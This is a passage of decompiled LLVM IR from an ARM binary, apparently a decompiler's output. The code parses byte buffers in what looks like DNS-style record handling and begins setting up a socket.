dec_label_pc_104e0:                               ; preds = %dec_label_pc_104e0.preheader, %dec_label_pc_104e8
  %v0_105ac = phi i32 [ %v0_105ac47, %dec_label_pc_104e0.preheader ], [ 1, %dec_label_pc_104e8 ]
  %v0_104ec = phi i32 [ %v0_104ec45, %dec_label_pc_104e0.preheader ], [ %v3_10508, %dec_label_pc_104e8 ]
  %v0_105b0 = phi i32 [ %v0_104e843, %dec_label_pc_104e0.preheader ], [ %v2_104f8, %dec_label_pc_104e8 ]
  %v0_104e0 = phi i32 [ %v0_104e041, %dec_label_pc_104e0.preheader ], [ %v3_104fc, %dec_label_pc_104e8 ]
  %v7_104e0 = icmp eq i32 %v0_104e0, 191
  store i1 %v7_104e0, i1* %cpsr_z.global-to-local, align 1
  %tmp180 = icmp ult i32 %v0_104e0, 192
  br i1 %tmp180, label %dec_label_pc_105ac, label %dec_label_pc_104e8

dec_label_pc_104e8:                               ; preds = %dec_label_pc_104e0
  %v1_104e8 = add i32 %v0_105b0, 1
  %v2_104e8 = inttoptr i32 %v1_104e8 to i8*
  %v3_104e8 = load i8, i8* %v2_104e8, align 1
  %v4_104e8 = zext i8 %v3_104e8 to i32
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  %v2_104ec = add i32 %v0_104ec, %v1_10564
  %v2_104f8 = add i32 %v2_104ec, %v4_104e8
  store i32 %v2_104f8, i32* %r3.global-to-local, align 4
  %v1_104fc = inttoptr i32 %v2_104f8 to i8*
  %v2_104fc = load i8, i8* %v1_104fc, align 1
  %v3_104fc = zext i8 %v2_104fc to i32
  store i32 %v3_104fc, i32* %r2.global-to-local, align 4
  %v2_10500 = icmp eq i8 %v2_104fc, 0
  store i1 %v2_10500, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_10508 = mul nuw nsw i32 %v3_104fc, 256
  store i32 %v3_10508, i32* %r1.global-to-local, align 4
  br i1 %v2_10500, label %dec_label_pc_10510, label %dec_label_pc_104e0

dec_label_pc_10510:                               ; preds = %dec_label_pc_104d0.backedge, %dec_label_pc_104e8, %dec_label_pc_104c4
  %v1_10514 = phi i32 [ 1, %dec_label_pc_104c4 ], [ %v1_105b4, %dec_label_pc_104e8 ], [ %v1_105b449, %dec_label_pc_104d0.backedge ]
  %v0_10510 = phi i32 [ 0, %dec_label_pc_104c4 ], [ 1, %dec_label_pc_104e8 ], [ %v0_105ac, %dec_label_pc_104d0.backedge ]
  %v7_10510 = icmp eq i32 %v0_10510, 1
  store i1 %v7_10510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10510, label %bb127, label %bb128

bb127:                                            ; preds = %dec_label_pc_10510
  %v2_10514 = add i32 %v1_10514, 1
  store i32 %v2_10514, i32* %ip.global-to-local, align 4
  br label %bb128

bb128:                                            ; preds = %dec_label_pc_10510, %bb127
  %v1_10518 = phi i32 [ %v1_10514, %dec_label_pc_10510 ], [ %v2_10514, %bb127 ]
  %v2_10518 = add i32 %v1_10518, %v0_10518152
  store i32 %v2_10518, i32* @r4, align 4
  %v3_1051c = inttoptr i32 %v2_10518 to i8*
  %v4_1051c = load i8, i8* %v3_1051c, align 1
  %v6_1051c = zext i8 %v4_1051c to i32
  store i32 %v6_1051c, i32* %r3.global-to-local, align 4
  %v1_10520 = add i32 %v2_10518, 1
  %v2_10520 = inttoptr i32 %v1_10520 to i8*
  %v3_10520 = load i8, i8* %v2_10520, align 1
  %v4_10520 = zext i8 %v3_10520 to i32
  store i32 %v4_10520, i32* %r2.global-to-local, align 4
  %v4_10524 = mul nuw nsw i32 %v4_10520, 256
  %v5_10524 = or i32 %v4_10524, %v6_1051c
  store i32 %v5_10524, i32* %r3.global-to-local, align 4
  %v7_10528 = icmp eq i32 %v5_10524, 256
  store i1 %v7_10528, i1* %cpsr_z.global-to-local, align 1
  %v1_1052c = add i32 %v2_10518, 10
  store i32 %v1_1052c, i32* @r5, align 4
  br i1 %v7_10528, label %dec_label_pc_105cc, label %dec_label_pc_10534

dec_label_pc_10534:                               ; preds = %dec_label_pc_105cc, %bb128
  store i32 %v1_1052c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1054023 = inttoptr i32 %v1_1052c to i8*
  %v2_1054024 = load i8, i8* %v1_1054023, align 1
  %v3_1054025 = zext i8 %v2_1054024 to i32
  store i32 %v3_1054025, i32* %r2.global-to-local, align 4
  %v2_1054426 = icmp eq i8 %v2_1054024, 0
  store i1 %v2_1054426, i1* %cpsr_z.global-to-local, align 1
  %v3_1054827 = mul nuw nsw i32 %v3_1054025, 256
  store i32 %v3_1054827, i32* %r1.global-to-local, align 4
  br i1 %v2_1054426, label %dec_label_pc_10580, label %dec_label_pc_10550.preheader

dec_label_pc_10550.preheader:                     ; preds = %dec_label_pc_10534, %dec_label_pc_10540.backedge
  %v1_105c4 = phi i32 [ %v1_105c464, %dec_label_pc_10540.backedge ], [ 1, %dec_label_pc_10534 ]
  %v0_105bc62 = phi i32 [ %v0_105bc, %dec_label_pc_10540.backedge ], [ 0, %dec_label_pc_10534 ]
  %v0_1055c60 = phi i32 [ %v3_10548, %dec_label_pc_10540.backedge ], [ %v3_1054827, %dec_label_pc_10534 ]
  %v0_1055858 = phi i32 [ %v1_105c0, %dec_label_pc_10540.backedge ], [ %v1_1052c, %dec_label_pc_10534 ]
  %v0_1055056 = phi i32 [ %v3_10540, %dec_label_pc_10540.backedge ], [ %v3_1054025, %dec_label_pc_10534 ]
  br label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %dec_label_pc_10550.preheader, %dec_label_pc_10558
  %v0_105bc = phi i32 [ %v0_105bc62, %dec_label_pc_10550.preheader ], [ 1, %dec_label_pc_10558 ]
  %v0_1055c = phi i32 [ %v0_1055c60, %dec_label_pc_10550.preheader ], [ %v3_10578, %dec_label_pc_10558 ]
  %v0_105c0 = phi i32 [ %v0_1055858, %dec_label_pc_10550.preheader ], [ %v2_10568, %dec_label_pc_10558 ]
  %v0_10550 = phi i32 [ %v0_1055056, %dec_label_pc_10550.preheader ], [ %v3_1056c, %dec_label_pc_10558 ]
  %v7_10550 = icmp eq i32 %v0_10550, 191
  store i1 %v7_10550, i1* %cpsr_z.global-to-local, align 1
  %tmp181 = icmp ult i32 %v0_10550, 192
  br i1 %tmp181, label %dec_label_pc_105bc, label %dec_label_pc_10558

dec_label_pc_10558:                               ; preds = %dec_label_pc_10550
  %v1_10558 = add i32 %v0_105c0, 1
  %v2_10558 = inttoptr i32 %v1_10558 to i8*
  %v3_10558 = load i8, i8* %v2_10558, align 1
  %v4_10558 = zext i8 %v3_10558 to i32
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  %v2_1055c = add i32 %v0_1055c, %v1_10564
  %v2_10568 = add i32 %v2_1055c, %v4_10558
  store i32 %v2_10568, i32* %r3.global-to-local, align 4
  %v1_1056c = inttoptr i32 %v2_10568 to i8*
  %v2_1056c = load i8, i8* %v1_1056c, align 1
  %v3_1056c = zext i8 %v2_1056c to i32
  store i32 %v3_1056c, i32* %r2.global-to-local, align 4
  %v2_10570 = icmp eq i8 %v2_1056c, 0
  store i1 %v2_10570, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_10578 = mul nuw nsw i32 %v3_1056c, 256
  store i32 %v3_10578, i32* %r1.global-to-local, align 4
  br i1 %v2_10570, label %dec_label_pc_10580, label %dec_label_pc_10550

dec_label_pc_10580:                               ; preds = %dec_label_pc_10540.backedge, %dec_label_pc_10558, %dec_label_pc_10534
  %v1_10584 = phi i32 [ 1, %dec_label_pc_10534 ], [ %v1_105c4, %dec_label_pc_10558 ], [ %v1_105c464, %dec_label_pc_10540.backedge ]
  %v0_10580 = phi i32 [ 0, %dec_label_pc_10534 ], [ 1, %dec_label_pc_10558 ], [ %v0_105bc, %dec_label_pc_10540.backedge ]
  %v7_10580 = icmp eq i32 %v0_10580, 1
  store i1 %v7_10580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10580, label %bb129, label %bb130

bb129:                                            ; preds = %dec_label_pc_10580
  %v2_10584 = add i32 %v1_10584, 1
  store i32 %v2_10584, i32* %r0.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_10580, %bb129
  %v1_10588 = phi i32 [ %v1_10584, %dec_label_pc_10580 ], [ %v2_10584, %bb129 ]
  %v2_10588 = add i32 %v1_10588, %v1_1052c
  br label %dec_label_pc_104b0.backedge

dec_label_pc_104b0.backedge:                      ; preds = %bb130, %dec_label_pc_10674
  %v0_104b0.pre = phi i32 [ %v3_104bc153, %bb130 ], [ %v0_104b0.pre.pre, %dec_label_pc_10674 ]
  %storemerge = phi i32 [ %v2_10588, %bb130 ], [ %v2_10688, %dec_label_pc_10674 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_104b0 = add i32 %v0_104b0.pre, -1
  %v3_104b4 = mul i32 %v1_104b0, 65536
  store i32 %v3_104b4, i32* %r3.global-to-local, align 4
  %v7_104b8 = icmp eq i32 %v3_104b4, -65536
  store i1 %v7_104b8, i1* %cpsr_z.global-to-local, align 1
  %v3_104bc = urem i32 %v1_104b0, 65536
  store i32 %v3_104bc, i32* @r6, align 4
  br i1 %v7_104b8, label %dec_label_pc_10424, label %dec_label_pc_104c4

dec_label_pc_10590:                               ; preds = %dec_label_pc_10424
  %v1_10590 = add i32 %v2_1015c, 4
  %v2_10590 = inttoptr i32 %v1_10590 to i32*
  %v3_10590 = load i32, i32* %v2_10590, align 4
  store i32 %v3_10590, i32* %r0.global-to-local, align 4
  %v2_10594 = icmp eq i32 %v3_10590, 0
  store i1 %v2_10594, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1059c.181 to i32), i32* @lr, align 4
  %v1_10598 = xor i1 %v2_10594, true
  call void @__pseudo_cond_branch(i1 %v1_10598, i32 ptrtoint (i32* @global_var_142ec.59 to i32))
  store i32 %v2_1015c, i32* @r0, align 4
  %v0_105a0 = call i32 @function_142ec()
  store i32 %v0_105a0, i32* %r0.global-to-local, align 4
  %v0_105a4 = load i32, i32* @r4, align 4
  %v5_105a4 = inttoptr i32 %v0_105a4 to i8*
  br label %dec_label_pc_1043c

dec_label_pc_105ac:                               ; preds = %dec_label_pc_104e0
  %v2_105ac = icmp eq i32 %v0_105ac, 0
  store i1 %v2_105ac, i1* %cpsr_z.global-to-local, align 1
  %v1_105b0 = add i32 %v0_105b0, 1
  store i32 %v1_105b0, i32* %r3.global-to-local, align 4
  br i1 %v2_105ac, label %bb131, label %dec_label_pc_104d0.backedge

dec_label_pc_104d0.backedge:                      ; preds = %dec_label_pc_105ac, %bb131
  %v1_105b449 = phi i32 [ %v1_105b4, %dec_label_pc_105ac ], [ %v2_105b4, %bb131 ]
  %v1_104d0 = inttoptr i32 %v1_105b0 to i8*
  %v2_104d0 = load i8, i8* %v1_104d0, align 1
  %v3_104d0 = zext i8 %v2_104d0 to i32
  store i32 %v3_104d0, i32* %r2.global-to-local, align 4
  %v2_104d4 = icmp eq i8 %v2_104d0, 0
  store i1 %v2_104d4, i1* %cpsr_z.global-to-local, align 1
  %v3_104d8 = mul nuw nsw i32 %v3_104d0, 256
  store i32 %v3_104d8, i32* %r1.global-to-local, align 4
  br i1 %v2_104d4, label %dec_label_pc_10510, label %dec_label_pc_104e0.preheader

bb131:                                            ; preds = %dec_label_pc_105ac
  %v2_105b4 = add i32 %v1_105b4, 1
  store i32 %v2_105b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_104d0.backedge

dec_label_pc_105bc:                               ; preds = %dec_label_pc_10550
  %v2_105bc = icmp eq i32 %v0_105bc, 0
  store i1 %v2_105bc, i1* %cpsr_z.global-to-local, align 1
  %v1_105c0 = add i32 %v0_105c0, 1
  store i32 %v1_105c0, i32* %r3.global-to-local, align 4
  br i1 %v2_105bc, label %bb132, label %dec_label_pc_10540.backedge

dec_label_pc_10540.backedge:                      ; preds = %dec_label_pc_105bc, %bb132
  %v1_105c464 = phi i32 [ %v1_105c4, %dec_label_pc_105bc ], [ %v2_105c4, %bb132 ]
  %v1_10540 = inttoptr i32 %v1_105c0 to i8*
  %v2_10540 = load i8, i8* %v1_10540, align 1
  %v3_10540 = zext i8 %v2_10540 to i32
  store i32 %v3_10540, i32* %r2.global-to-local, align 4
  %v2_10544 = icmp eq i8 %v2_10540, 0
  store i1 %v2_10544, i1* %cpsr_z.global-to-local, align 1
  %v3_10548 = mul nuw nsw i32 %v3_10540, 256
  store i32 %v3_10548, i32* %r1.global-to-local, align 4
  br i1 %v2_10544, label %dec_label_pc_10580, label %dec_label_pc_10550.preheader

bb132:                                            ; preds = %dec_label_pc_105bc
  %v2_105c4 = add i32 %v1_105c4, 1
  store i32 %v2_105c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10540.backedge

dec_label_pc_105cc:                               ; preds = %bb128
  %v1_105cc = add i32 %v2_10518, 2
  %v2_105cc = inttoptr i32 %v1_105cc to i8*
  %v3_105cc = load i8, i8* %v2_105cc, align 1
  %v4_105cc = zext i8 %v3_105cc to i32
  store i32 %v4_105cc, i32* %r3.global-to-local, align 4
  %v1_105d0 = add i32 %v2_10518, 3
  %v2_105d0 = inttoptr i32 %v1_105d0 to i8*
  %v3_105d0 = load i8, i8* %v2_105d0, align 1
  %v4_105d0 = zext i8 %v3_105d0 to i32
  store i32 %v4_105d0, i32* %r2.global-to-local, align 4
  %v4_105d4 = mul nuw nsw i32 %v4_105d0, 256
  %v5_105d4 = or i32 %v4_105d4, %v4_105cc
  store i32 %v5_105d4, i32* %r3.global-to-local, align 4
  %v7_105d8 = icmp eq i32 %v5_105d4, 256
  store i1 %v7_105d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105d8, label %dec_label_pc_105e0, label %dec_label_pc_10534

dec_label_pc_105e0:                               ; preds = %dec_label_pc_105cc
  %v1_105e0 = add i32 %v2_10518, 8
  %v2_105e0 = inttoptr i32 %v1_105e0 to i8*
  %v3_105e0 = load i8, i8* %v2_105e0, align 1
  %v4_105e0 = zext i8 %v3_105e0 to i32
  store i32 %v4_105e0, i32* %r1.global-to-local, align 4
  %v1_105e4 = add i32 %v2_10518, 9
  %v2_105e4 = inttoptr i32 %v1_105e4 to i8*
  %v3_105e4 = load i8, i8* %v2_105e4, align 1
  %v4_105e4 = zext i8 %v3_105e4 to i32
  store i32 %v4_105e4, i32* %r0.global-to-local, align 4
  %v4_105e8 = mul nuw nsw i32 %v4_105e4, 256
  %v5_105e8 = or i32 %v4_105e8, %v4_105e0
  %v3_105ec = mul i32 %v5_105e8, 65536
  store i32 %v3_105ec, i32* %r2.global-to-local, align 4
  %v3_105f0 = mul nuw nsw i32 %v4_105e0, 256
  %v5_105f8 = or i32 %v4_105e4, %v3_105f0
  store i32 %v5_105f8, i32* %r3.global-to-local, align 4
  %v7_105fc = icmp eq i32 %v5_105f8, 4
  store i1 %v7_105fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105fc, label %dec_label_pc_10604, label %dec_label_pc_10674

dec_label_pc_10604:                               ; preds = %dec_label_pc_105e0
  %v2_10604 = inttoptr i32 %v1_1052c to i8*
  %v3_10604 = load i8, i8* %v2_10604, align 1
  %v4_10604 = zext i8 %v3_10604 to i32
  store i32 %v4_10604, i32* %r3.global-to-local, align 4
  store i32 %v2_101dc, i32* %r2.global-to-local, align 4
  %v1_10610 = add i32 %v2_10518, 11
  %v2_10610 = inttoptr i32 %v1_10610 to i8*
  %v3_10610 = load i8, i8* %v2_10610, align 1
  %v4_10610 = zext i8 %v3_10610 to i32
  store i32 %v4_10610, i32* %r2.global-to-local, align 4
  store i32 %v2_101dc, i32* %r3.global-to-local, align 4
  %v1_1061c = add i32 %v2_10518, 12
  %v2_1061c = inttoptr i32 %v1_1061c to i8*
  %v3_1061c = load i8, i8* %v2_1061c, align 1
  %v4_1061c = zext i8 %v3_1061c to i32
  store i32 %v4_1061c, i32* %r3.global-to-local, align 4
  store i32 %v2_101dc, i32* %ip.global-to-local, align 4
  %v1_10628 = add i32 %v2_10518, 13
  %v2_10628 = inttoptr i32 %v1_10628 to i8*
  %v3_10628 = load i8, i8* %v2_10628, align 1
  %v4_10628 = zext i8 %v3_10628 to i32
  store i32 %v4_10628, i32* %r2.global-to-local, align 4
  store i32 %v2_1015c, i32* @lr, align 4
  %v2_10634 = load i8, i8* %v3_1015c, align 1
  %v3_10634 = zext i8 %v2_10634 to i32
  %v3_10638 = mul nuw nsw i32 %v3_10634, 4
  %v1_1063c = add nuw nsw i32 %v3_10638, 4
  store i32 %v1_1063c, i32* %r1.global-to-local, align 4
  %v3_10640 = load i32, i32* %v2_10640, align 4
  store i32 %v3_10640, i32* %r0.global-to-local, align 4
  %v3_10644 = sext i8 %v3_10628 to i32
  %v5_10644 = sext i8 %v3_1061c to i32
  %v10_10644 = call i32 @function_143dc(i32 %v3_10640, i32 %v1_1063c, i32 %v3_10644, i32 %v5_10644)
  store i32 %v10_10644, i32* %r0.global-to-local, align 4
  store i32 %v2_1015c, i32* %r1.global-to-local, align 4
  store i32 %v2_101dc, i32* %ip.global-to-local, align 4
  %v2_10650 = load i8, i8* %v3_1015c, align 1
  %v3_10650 = zext i8 %v2_10650 to i32
  store i32 %v3_10650, i32* %r2.global-to-local, align 4
  %v4_10654 = sext i8 %v3_10604 to i32
  store i32 %v4_10654, i32* %r3.global-to-local, align 4
  store i32 %v2_1015c, i32* @lr, align 4
  %v1_1065c = add nuw nsw i32 %v3_10650, 1
  store i32 %v1_1065c, i32* %r1.global-to-local, align 4
  %v5_10660 = mul nuw nsw i32 %v3_10650, 4
  %v6_10660 = add i32 %v5_10660, %v10_10644
  %v7_10660 = inttoptr i32 %v6_10660 to i32*
  store i32 %v4_10654, i32* %v7_10660, align 4
  %v1_10664 = load i32, i32* @lr, align 4
  %v2_10664 = add i32 %v1_10664, 4
  %v3_10664 = inttoptr i32 %v2_10664 to i32*
  store i32 %v10_10644, i32* %v3_10664, align 4
  %v0_10668 = load i32, i32* %r1.global-to-local, align 4
  %v1_10668 = trunc i32 %v0_10668 to i8
  %v2_10668 = load i32, i32* @lr, align 4
  %v3_10668 = inttoptr i32 %v2_10668 to i8*
  store i8 %v1_10668, i8* %v3_10668, align 1
  %v0_1066c = load i32, i32* @r4, align 4
  %v1_1066c = add i32 %v0_1066c, 9
  %v2_1066c = inttoptr i32 %v1_1066c to i8*
  %v3_1066c = load i8, i8* %v2_1066c, align 1
  %v4_1066c = zext i8 %v3_1066c to i32
  store i32 %v4_1066c, i32* %r0.global-to-local, align 4
  %v1_10670 = add i32 %v0_1066c, 8
  %v2_10670 = inttoptr i32 %v1_10670 to i8*
  %v3_10670 = load i8, i8* %v2_10670, align 1
  %v4_10670 = zext i8 %v3_10670 to i32
  store i32 %v4_10670, i32* %r1.global-to-local, align 4
  %v0_10688.pre = load i32, i32* @r5, align 4
  %v0_104b0.pre.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10674

dec_label_pc_10674:                               ; preds = %dec_label_pc_105e0, %dec_label_pc_10604
  %v0_104b0.pre.pre = phi i32 [ %v3_104bc153, %dec_label_pc_105e0 ], [ %v0_104b0.pre.pre.pre, %dec_label_pc_10604 ]
  %v0_10688 = phi i32 [ %v1_1052c, %dec_label_pc_105e0 ], [ %v0_10688.pre, %dec_label_pc_10604 ]
  %v1_10674 = phi i32 [ %v4_105e4, %dec_label_pc_105e0 ], [ %v4_1066c, %dec_label_pc_10604 ]
  %v0_10674 = phi i32 [ %v4_105e0, %dec_label_pc_105e0 ], [ %v4_10670, %dec_label_pc_10604 ]
  %v4_10674 = mul nuw nsw i32 %v1_10674, 256
  %v5_10674 = or i32 %v4_10674, %v0_10674
  %v3_10678 = mul i32 %v5_10674, 65536
  store i32 %v3_10678, i32* %r2.global-to-local, align 4
  %tmp133 = mul nuw nsw i32 %v0_10674, 256
  %v5_10684 = or i32 %tmp133, %v1_10674
  store i32 %v5_10684, i32* %r3.global-to-local, align 4
  %v2_10688 = add i32 %v5_10684, %v0_10688
  br label %dec_label_pc_104b0.backedge

; uselistorder directives
  uselistorder i32 %v1_10674, { 1, 0 }
  uselistorder i32 %v3_10650, { 1, 0, 2 }
  uselistorder i32 %v10_10644, { 1, 0, 2 }
  uselistorder i32 %v4_105e4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_105e0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_105c4, { 1, 0 }
  uselistorder i32 %v3_10540, { 0, 2, 1 }
  uselistorder i32 %v1_105c464, { 1, 0 }
  uselistorder i32 %v1_105c0, { 1, 2, 0 }
  uselistorder i32 %v2_105b4, { 1, 0 }
  uselistorder i32 %v3_104d0, { 0, 2, 1 }
  uselistorder i32 %v1_105b449, { 1, 0 }
  uselistorder i32 %v1_105b0, { 1, 2, 0 }
  uselistorder i1 %v7_104b8, { 1, 0 }
  uselistorder i32 %v1_104b0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_1056c, { 0, 2, 1 }
  uselistorder i32 %v2_10568, { 1, 2, 0 }
  uselistorder i32 %v0_105bc, { 2, 0, 1 }
  uselistorder i32 %v1_105c4, { 1, 2, 0 }
  uselistorder i32 %v3_1054827, { 1, 0 }
  uselistorder i32 %v3_1054025, { 1, 0, 2 }
  uselistorder i32 %v1_1052c, { 2, 3, 1, 0, 5, 4, 6 }
  uselistorder i32 %v2_10518, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_104fc, { 0, 2, 1 }
  uselistorder i32 %v2_104f8, { 1, 2, 0 }
  uselistorder i32 %v0_105ac, { 2, 0, 1 }
  uselistorder i32 %v1_105b4, { 1, 2, 0 }
  uselistorder i32 %v3_104d821, { 1, 0 }
  uselistorder i32 %v3_104d019, { 1, 0, 2 }
  uselistorder i32 %v0_10518152, { 3, 0, 1, 2 }
  uselistorder i32 %v3_104bc151, { 1, 0 }
  uselistorder i1 %v7_104b8150, { 1, 0 }
  uselistorder i32 %v1_104b0143, { 1, 0 }
  uselistorder i32 %v4_10498, { 1, 0, 2 }
  uselistorder i32 %v0_1041c, { 1, 0 }
  uselistorder i32 %v0_103f4, { 1, 0 }
  uselistorder i1 %v7_103a8, { 1, 0 }
  uselistorder i32 %v5_103a4, { 1, 0, 2 }
  uselistorder i32 %v1_10368, { 1, 0 }
  uselistorder i32 %v3_10354, { 1, 0 }
  uselistorder i32 %v0_1034c, { 1, 0 }
  uselistorder i32 %v1_10340, { 1, 2, 0 }
  uselistorder i1 %v7_1030c, { 1, 0 }
  uselistorder i32 %v5_10308, { 1, 0, 2 }
  uselistorder i1 %v7_102f0, { 1, 0 }
  uselistorder i32 %v4_102ec, { 1, 0, 2 }
  uselistorder i1 %v7_102d4, { 1, 0 }
  uselistorder i32 %v3_102d0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_102b8, { 2, 1, 0 }
  uselistorder i32 %v1_102bc, { 1, 0 }
  uselistorder i32 %v1_1045c, { 1, 2, 0 }
  uselistorder i32 %v2_10358, { 1, 0, 2 }
  uselistorder i32 %v2_102b4, { 1, 0, 2 }
  uselistorder i32 %v2_1027c, { 4, 3, 2, 5, 7, 9, 1, 0, 6, 8, 10 }
  uselistorder i32 %v4_10230, { 3, 0, 2, 1 }
  uselistorder i32 %v1_101fc, { 1, 0, 2 }
  uselistorder i32 %v0_101b8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_101b4, { 1, 0, 2 }
  uselistorder i32 %v1_101b0, { 1, 0 }
  uselistorder i32 %v2_101a411, { 1, 0 }
  uselistorder i32 %v2_101a4, { 1, 0 }
  uselistorder i1 %v8_10194, { 1, 0 }
  uselistorder i32 %v2_1017c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10164, { 1, 0 }
  uselistorder i32 %v2_1015c, { 2, 3, 4, 5, 0, 1, 6, 7 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-2240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-64, { 0, 1, 3, 2 }
  uselistorder i8* %stack_var_-4288, { 2, 0, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 13, 11, 12, 14, 16, 33, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 34, 35, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 11, 7, 28, 9, 10, 29, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25, 27 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 11, 6, 7, 28, 9, 10, 27, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 29, 24, 30, 26 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 10, 6, 48, 7, 8, 9, 12, 11, 15, 14, 13, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 37, 32, 31, 33, 34, 35, 36, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 6, 3, 5, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 9, 3, 14, 4, 5, 15, 6, 7, 8, 35, 10, 11, 12, 13, 34, 36, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26, 27, 28, 33, 31, 29, 30, 32, 37 }
  uselistorder i32 (i32)* @function_14ac4, { 10, 9, 3, 2, 11, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_10674, { 1, 0 }
  uselistorder label %dec_label_pc_10540.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_104d0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_104b0.backedge, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_10550, { 1, 0 }
  uselistorder label %dec_label_pc_10550.preheader, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %dec_label_pc_104e0, { 1, 0 }
  uselistorder label %dec_label_pc_104e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_104c4, { 1, 0 }
  uselistorder label %dec_label_pc_1043c, { 1, 0 }
  uselistorder label %dec_label_pc_10424, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10404, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1018c, { 1, 0 }
}

define i32 @function_10690(i32 %arg1) local_unnamed_addr {
dec_label_pc_10690:
  %v2_10694 = load i32, i32* @global_var_1ecdc.183, align 4
  %v3_1069c = call i32 @function_1379c(i32 %v2_10694, i32 9)
  %v0_106a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_106a0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10690
  %v4_106a0 = load i64, i64* inttoptr (i32 9 to i64*), align 4
  %v6_106a0 = trunc i64 %v4_106a0 to i32
  call void @__pseudo_branch(i32 %v6_106a0)
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10690, %bb
  ret i32 %v3_1069c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_106a4() local_unnamed_addr {
dec_label_pc_106a4:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_106a4 = load i32, i32* @r4, align 4
  store i32 %v3_106a4, i32* %stack_var_-16, align 4
  %v0_106a8 = load i32, i32* @r0, align 4
  store i32 %v0_106a8, i32* %r5.global-to-local, align 4
  %v1_106ac = add i32 %v0_106a8, 4
  %v2_106ac = inttoptr i32 %v1_106ac to i32*
  %v3_106ac = load i32, i32* %v2_106ac, align 4
  store i32 %v3_106ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 67280, i32* @lr, align 4
  %v1_106cc = icmp ne i32 %v3_106ac, -1
  call void @__pseudo_cond_branch(i1 %v1_106cc, i32 ptrtoint (i32* @global_var_1369c.26 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_106dc = call i32 @function_13f90(i32 2, i32 1, i32 0)
  store i32 %v3_106dc, i32* %r3.global-to-local, align 4
  %v7_106e4 = icmp eq i32 %v3_106dc, -1
  %v0_106ec = load i32, i32* %r5.global-to-local, align 4
  %v1_106ec = add i32 %v0_106ec, 28
  store i32 %v1_106ec, i32* %r0.global-to-local, align 4
  %v2_106f0 = add i32 %v0_106ec, 4
  %v3_106f0 = inttoptr i32 %v2_106f0 to i32*
  store i32 %v3_106dc, i32* %v3_106f0, align 4
  br i1 %v7_106e4, label %dec_label_pc_106a4.dec_label_pc_1076c_crit_edge, label %dec_label_pc_106f8

dec_label_pc_106a4.dec_label_pc_1076c_crit_edge:  ; preds = %dec_label_pc_106a4
  %v14_10770.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1076c

